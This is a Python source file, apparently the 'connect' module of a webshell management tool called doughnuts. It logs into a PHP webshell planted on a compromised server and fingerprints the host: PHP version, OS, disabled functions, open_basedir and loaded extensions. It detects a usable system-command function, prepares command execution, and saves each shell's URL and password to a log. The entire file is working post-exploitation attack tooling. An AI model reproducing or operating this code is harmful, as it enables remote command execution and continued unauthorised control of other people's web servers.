from os import path, SEEK_END
from random import randint
from string import ascii_letters, digits
from urllib.parse import urlparse, unquote_plus

from libs.config import alias, color, gget, gset, set_namespace
from libs.app import value_translation
from libs.myapp import base64_encode, is_windows, print_webshell_info, send, prepare_system_template, randstr, update_prompt, get_ini_value_code
from libs.functions.main_plugins.connect import *

"""
url ['webshell']
webshell.params_dict ['webshell']
webshell.password ['webshell']
webshell.method ['webshell']
webshell.encode_functions ['webshell']  Encoder(s) used by webshell
webshell.disable_functions ['webshell']
webshell.netloc ['webshell']
webshell.download_path ['webshell']
webshell.os_version ['webshell']
webshell.php_version ['webshell']
webshell.root ['webshell']
webshell.webshell_root ['webshell']
webshell.v7 ['webshell'] Whether is php7
webshell.iswin ['webshell'] Whether is windows
webshell.upload_tmp_dir ['webshell']
webshell.from_log ['webshell'] Whether connect from log
"""


@alias(True, "c", u="url", m="method", p="pwd")
def run(url: str, method: str = "GET", pwd: str = "pass", *encoders_or_params):
    """
    connect

    Connect a webshell of php.

    eg: connect {url} {method} {pass} {encoders_or_params...}
    """
    method = str(method).upper()
    params_dict = {"headers": {}}
    if method == "GET":
        raw_key = "params"
    elif method == "POST":
        raw_key = "data"
    elif method == "COOKIE":
        raw_key = "cookies"
    elif method == "HEADER":
        raw_key = "headers"
    else:
        print(color.red("Method error"))
        return

    # if (is_windows(False)):
    #     new_eop = []
    #     extra_params = []
    #     pass_next = False
    #     eop_len = len(encoders_or_params)
    #     for i in range(eop_len):  # 清洗数据,解决windows下a=b传成2个参数的错误
    #         v = str(encoders_or_params[i])
    #         if (pass_next):
    #             pass_next = False
    #             continue
    #         if (":" not in v):
    #             new_eop.append(str(v))
    #         elif (i < eop_len - 1):
    #             extra_params.append(v + "=" + str(encoders_or_params[i+1]))
    #             pass_next = True
    #     encoders_or_params = new_eop

    extra_params = [f for f in encoders_or_params if "=" in str(f)]

    params_dict[raw_key] = {}
    for each in extra_params:
        if(":" in each):
            k, data = each.split(":", 1)
            if (k not in params_dict):
                params_dict[k] = {}
            pairs = [p.split("=", 1) for p in data.split("&")]

            values_dict = {unquote_plus(k): unquote_plus(v) for k, v in pairs}

            params_dict[k].update(values_dict)
        else:
            k, data = each.split("=", 1)
            if (k not in params_dict):
                params_dict[k] = {}
            if (k == "auth"):
                params_dict[k] = value_translation(data)

    parsed = urlparse(url)
    webshell_netloc = parsed.netloc
    webshell_scheme = parsed.scheme

    gset("webshell.url", url, namespace="webshell")
    gset("webshell.params_dict", params_dict, namespace="webshell")
    gset("webshell.password", str(pwd), namespace="webshell")
    gset("webshell.method", raw_key, namespace="webshell")
    gset("webshell.encode_functions", encoders_or_params, namespace="webshell")
    gset("webshell.scheme", webshell_scheme, namespace="webshell")
    gset("webshell.netloc", webshell_netloc, namespace="webshell")
    gset(
        "webshell.download_path",
        path.join(gget("root_path"), "target",
                  webshell_netloc.replace(":", "_")),
        namespace="webshell",
    )
    gset("webshell.pwd", ".", namespace="webshell")
    gset("webshell.bypass_df", -1, namespace="webshell")
    version_flag_start = randstr(
        string=ascii_letters + digits, offset=randint(32, 62))
    version_flag_end = randstr(
        string=ascii_letters + digits, offset=randint(32, 62))
    verify_string = randstr(ascii_letters)

    res = send(
        get_php_version(
            version_flag_start,
            version_flag_end,
            base64_encode(verify_string)),
        raw=True)

    if (not res or version_flag_start not in res.r_text):
        print(color.red("Connect failed..."))
        if (res):
            print(res.r_text)
        return False

    # 判断版本
    if ('7.' in res.r_text or "Unknown" in res.r_text):
        gset("webshell.v7", True, namespace="webshell")

    # 判断base64函数是否可用
    if verify_string not in res.r_text:
        gset("webshell.disable_base64_decode", True, namespace="webshell")
        gset("webshell.base64_en_func", "b64e", namespace="webshell")
        gset("webshell.base64_de_func", "b64d", namespace="webshell")

    if version_flag_start in res.r_text:  # 验证是否成功连接
        gset(
            "webshell.php_version",
            res.r_text.split(
                version_flag_start +
                "|")[1].split(
                "|" +
                version_flag_end)[0],
            namespace="webshell")
        # 获取总体信息
        info_req = send(get_php_uname(get_ini_value_code()))
        info = info_req.r_text.strip().split("|")

        # web根目录
        gset("webshell.root", info[0], namespace="webshell")

        # 是否为windows
        gset(
            "webshell.iswin",
            (True if "win" in info[1].lower() else False),
            namespace="webshell",
        )

        # 服务器版本
        gset("webshell.server_version", info[2], namespace="webshell")

        # 当前目录
        gset("webshell.pwd", info[3], namespace="webshell")

        # webshell所在目录
        gset("webshell.webshell_root", info[3], namespace="webshell")

        # 标识符
        gset(
            "webshell.prompt",
            f"doughnuts ({color.cyan(webshell_netloc)}) > ")

        # 初始化执行系统命令模板
        exec_func = send(
            get_php_detectd_exec(
                get_ini_value_code())).r_text.strip()
        prepare_system_template(exec_func)
        gset("webshell.exec_func", exec_func, namespace="webshell")

        # 设置文件上传目录
        upload_tmp_dir = info[4]
        if (not upload_tmp_dir):
            if (not is_windows()):
                upload_tmp_dir = "/tmp/"
            else:
                upload_tmp_dir = "C:\\Windows\\Temp"
        else:
            if (is_windows()):
                upload_tmp_dir += "\\Temp\\"
            else:
                upload_tmp_dir += "/"
        gset("webshell.upload_tmp_dir", upload_tmp_dir, namespace="webshell")

        # open_basedir
        gset("webshell.obd", info[6], namespace="webshell")

        # 系统位数
        bits = info[7]
        try:
            bits = int(bits)
        except ValueError:
            bits = 0
            print(color.yellow("detect architecture error\n"))

        # 系统版本
        gset(
            "webshell.os_version",
            info[1] +
            " (%d bits)" %
            bits,
            namespace="webshell")

        # 系统架构
        gset("webshell.arch", bits, namespace="webshell")

        # 分隔符
        info[8] = info[8] if info[8] else "/"
        gset("webshell.directory_separator", info[8], namespace="webshell")

        # disable_functions
        disable_function_list = [f.strip() for f in info[5].split(",")]
        if ('' in disable_function_list):
            disable_function_list.remove('')
        gset(
            "webshell.disable_functions",
            disable_function_list,
            namespace="webshell")

        # disable_classes
        disable_classes_list = [f.strip() for f in info[9].split(",")]
        if ('' in disable_classes_list):
            disable_classes_list.remove('')
        gset(
            "webshell.disable_classes",
            disable_classes_list,
            namespace="webshell")

        root_path = gget("root_path")
        from_log = gget("webshell.from_log", "webshell")

        # 获取扩展信息
        info_req = send(get_php_loaded_extensions())
        info = info_req.r_text.strip().split("|")

        if info[0] == "Unknown":
            gset("webshell.loaded_ext", False, namespace="webshell")
        else:
            gset("webshell.loaded_ext", info, namespace="webshell")

        if not from_log:
            extra = "|".join(encoders_or_params) + \
                "|" if encoders_or_params else ""
            with open(path.join(root_path, "webshell.log"), "ab+") as f:
                text = f.read()
                if (text):
                    f.seek(-1, SEEK_END)
                    if f.read(1) != b"\n":
                        f.write(b"\n")
                f.write(f"{url}|{method}|{pwd}|{extra}\n".encode())
        else:
            gset("webshell.from_log", False, True, "webshell")
        print(color.cyan("Connect success...\n"))
        print_webshell_info()
        set_namespace("webshell", callback=False)
        update_prompt()
        if (exec_func == ''):
            print(color.red("No system execute function\n"))
        return True
